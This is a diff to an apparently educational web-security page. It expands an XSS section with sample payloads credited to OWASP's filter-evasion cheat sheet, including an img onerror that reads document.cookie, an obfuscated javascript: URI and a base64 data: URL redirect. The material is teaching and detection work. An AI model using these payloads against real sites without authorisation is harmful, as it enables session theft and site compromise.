@@ -41,11 +41,18 @@
 							</section>
 							<section id="xss" class="main">
 								<h2>Cross-Site Scripting (XSS)</h2>
-								<p>Cross-site scripting is an extremely dangerous attack that has innumerable consequences. Here are some example XSS attacks:</p>
+								<p>Cross-site scripting is an extremely dangerous attack that has innumerable consequences. Here are some example XSS scripts used to detect vulnerability:</p>
 								<pre><code class="lang-html">
 <span class="token punctuation"><</span><span class="string">BODY ONLOAD=alert('XSS')></span>
+<span class="token punctuation"><</span>b> onmouseover=alert('Wufff!')>click me!</b>
+<span class="token punctuation"><</span>img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+<span class="token punctuation"><</span>IMG SRC=j&#X41vascript:alert('test2')>
+<span class="token punctuation"><</span>META HTTP-EQUIV="refresh"
+CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"<span class="token punctuation">></span>
+
+
 								</code></pre>
-								<p>Code generously provided by OWASP: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</p>
+								<p>Code generously provided by <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">OWASP</a>.</p>
 							</section>
 							
 
